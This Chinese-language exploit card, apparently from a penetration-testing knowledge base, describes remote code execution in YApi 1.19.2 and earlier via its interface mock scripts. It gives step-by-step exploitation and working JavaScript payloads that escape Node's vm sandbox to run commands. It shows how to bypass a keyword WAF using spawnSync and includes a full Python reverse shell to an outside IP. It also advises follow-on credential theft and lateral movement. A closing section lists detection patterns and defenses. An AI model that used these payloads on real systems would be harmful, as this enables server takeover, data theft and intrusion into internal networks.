---
id: web-nodejs-yapi-mock-script-vm-rce
title: YApi <=1.19.2 接口 mock 脚本 RCE：注册建项目写脚本，访问接口经 vm 逃逸执行命令
type: scenario
domain: web
path: web/nodejs
technique: yapi-mock-script-vm-sandbox-rce
aliases:
- YApi mock 脚本 RCE
- YApi 接口脚本命令执行
- YApi <=1.19.2 代码执行
- YApi 前台 RCE
- mockJson 命令执行
- YApi vm 沙箱逃逸
tags:
- yapi
- nodejs
- rce
- script-injection
- vm-sandbox-escape
- authenticated
- mock
- waf-bypass
cve: []
severity: critical
confidence: high
affected_versions: YApi <= 1.19.2（原文标记）
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V352
  verified_at: '2026-11-09T00:39:35+08:00'
  notes: 已对照原文与图01-03核对：YApi 登录/注册页、原文明确 <=1.19.2 版本标记、经典 vm 逃逸载荷（this.constructor.constructor('return process') 后 mainModule.require('child_process')）与最终 spawnSync('python',['-c',...]) 载荷均与正文一致；图03 佐证反弹 shell 后 whoami=root 与 eth0/eth1 双网卡。受影响版本按原文保留 <=1.19.2。与既有 project.copy 卡（v1.10.2/<1.11.0，project.copy→after_script→run_auto_test）入口功能、触发方式、版本范围、PoC 均不同，同应用同 vm 逃逸原语但属不同场景，按 append_scenario 保留并互链，理由成立。PoC 未执行；frontmatter 无 sources/source_url；dup-scan(19:10)早于本批建卡无涉及 pair。
---

## 一句话结论

YApi 1.19.2 及更早版本的接口 mock 脚本功能在服务端 Node.js 进程中执行用户 JavaScript：注册普通用户后创建项目与接口，把 `this.constructor.constructor("return process")()` 取得宿主 `process`、再 `process.mainModule.require("child_process")` 执行命令的载荷写入接口 mock 脚本，访问该接口的 mock 地址即可拿到命令输出或以 Node 进程权限反弹 shell；即使保存请求被 WAF 按关键字拦截，也可换用等价的 `spawnSync` API 绕过。

## 原理

- **入口与权限**：YApi 默认允许注册（`closeRegister: false`），攻击者自行注册即可获得普通用户身份，无需管理员权限；登录后创建项目、添加接口，接口编辑页提供 mock 脚本（服务端 JavaScript）配置。
- **sink**：访问接口的 mock 地址时，YApi 的 mock 服务在服务端取出该接口保存的脚本并执行；执行环境为 Node.js 的 `vm`，脚本顶层 `this` 指向宿主创建的上下文对象。Node.js 官方明确 `vm` 不是安全边界，`this.constructor` 是宿主 `Object`，`this.constructor.constructor` 是宿主 `Function`，因此 `Function("return process")()` 能取回宿主 `process`——沙箱全局即使没有 `process`/`require`，也能到这里绕过。
- **命令执行与回显**：`process.mainModule.require("child_process")` 加载内置模块后，`execSync`/`spawnSync` 均可派生子进程，命令以 Node 进程权限运行；把结果赋给 mock 脚本的输出变量（如 `mockJson`）会随 mock 响应返回，形成回显通道；无回显时可用反向连接外带。
- **WAF 只认关键字**：保存恶意脚本的请求被 WAF 拒绝，而保存无害字符正常，说明是内容检测。用二分法分段保存可定位到被拦关键字是 `exec()`；由于 `child_process` 还提供 `spawn`/`spawnSync` 等等价 API，替换函数名并调整参数形式即可保存成功（见关联的 WAF 绕过卡）。
- **为什么成立**：整条链只依赖“注册用户可写脚本”与“mock 访问触发服务端执行”两个正常功能，加上 `vm` 沙箱可逃逸这一公开原语；版本范围内服务端没有对脚本做 AST/白名单限制，也未把脚本放到独立进程/容器。

## 触发条件

- YApi 版本 ≤ 1.19.2（原文标记；更高版本是否仍可执行需以实际版本与配置验证）。
- 目标可从网络访问且开放注册（或攻击者已有可登录账号）；`/api/user/status` 之类接口可先探测注册是否开放。
- 接口 mock 功能可用，mock 地址可访问（访问动作触发脚本执行）。
- Node.js 进程权限决定命令执行权限；允许出网时可直接反弹 shell，只有回显时也能读命令输出。
- 保存接口脚本的请求可能被 WAF 拦截；拦截为关键字级时可绕过，若配置了脚本功能开关或 AST 白名单则另论。

## 利用步骤

1. 打开目标 YApi 登录页，注册普通账号并登录；若注册关闭，改用已有低权限账号。
2. 创建项目，新增一个接口（mock 地址形如 `/mock/<项目>/<路径>`）。
3. 编辑该接口的 mock 脚本，写入逃逸载荷：先用 `execSync("whoami")` 之类的短命令验证；若保存时被 WAF 拒绝，按二分法分段保存定位被拦关键字。
4. 把被拦的 `execSync` 换成未拦截的等价 API（如 `spawnSync('python', ['-c', ...])` 或 `spawnSync('bash', ['-c', 'id'])`），注意命令与参数分离、spawn 默认不经 shell。
5. 保存成功后访问该接口的 mock 地址，命令输出随响应返回；或换成反向 shell 载荷（python/bash），等待回连。
6. 以取得的外壳当前权限为准（案例中为 root），进一步读取配置中的数据库口令、内网探测与横向；注意留痕最小化与授权范围。

## PoC

最小验证载荷（写入接口 mock 脚本，访问 mock 地址后输出 `whoami`）：

```javascript
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami")
```

WAF 拦截 `exec()` 时的实际可用载荷（替换为 `spawnSync`，以 python 反弹 shell；IP 与端口为目标 VPS 地址）：

```javascript
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
Poc = process.mainModule.require("child_process").spawnSync(
  'python', ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",6665));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']
)
```

说明：`process.mainModule` 依赖 CommonJS 入口；ESM 或新版本 Node 中可能不可用，需换其他能力放大路径。`spawnSync` 默认不经过 shell，原命令里的管道、重定向等 shell 语法要改为显式调用 `bash -c`/`python -c` 或拆成参数数组。

## 变体与关联

- **变体（入口）**：同一应用的 `project.copy` + `after_script` + `run_auto_test` 链（YApi v1.10.2 及更早，v1.11.0 加 `scriptEnable` 开关）；本卡是接口 mock 脚本入口，版本范围与触发动作均不同。
- **变体（触发）**：不访问 mock 地址而由其他服务端行为触发脚本时，需按实际调用点调整；有回显时用响应字段，无回显时用 `net`/子进程外连。
- **变体（绕过）**：WAF 除 `exec` 外还拦 `spawn`/`child_process`/`process` 时，可叠加字符串拼接、编码等混淆；但根本绕过是 API 等价替换与语法调整。
- 关联：[[web-nodejs-yapi-project-copy-script-vm-unauth-rce]]（同应用的另一条脚本注入链）、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（本链使用的原生 `vm` 逃逸原语）、[[web-nodejs-child-process-exec-keyword-waf-spawn-bypass]]（exec 关键字被禁时的等价 API 替换手法）。
- 边界：mock 功能被关闭、脚本执行被 AST 白名单/独立沙箱限制、或 Node 进程无 `process.mainModule` 时，本链不能直接成立。

## 检测与防御

- **升级与关闭面**：升级到已修复/受维护版本；不需要 mock 脚本时关闭该功能或限制可编辑角色；关闭匿名注册（`closeRegister: true`）。
- **脚本审计**：检索接口 mock 脚本中的 `constructor.constructor`、`Function(`、`process`、`mainModule`、`require("child_process")`、`execSync`、`spawn`、`spawnSync` 等特征，对保存脚本的接口做变更审计。
- **WAF/检测**：对保存接口脚本的请求做语法级（AST）检测而非关键字黑名单，覆盖 `child_process` 全 API 家族；监控 Node 进程派生的异常子进程（python/bash -c、nc）与 mock 响应中的命令输出特征（`uid=`、`root:`）。
- **运行环境**：YApi 以非 root 用户运行，限制容器/主机出网与文件系统权限；mock 服务与主服务隔离部署可降低影响面。
- **响应**：发现可疑 mock 脚本时保存证据并回滚，排查同时间段注册账号与项目变更，检查主机侧子进程、外连与持久化痕迹。
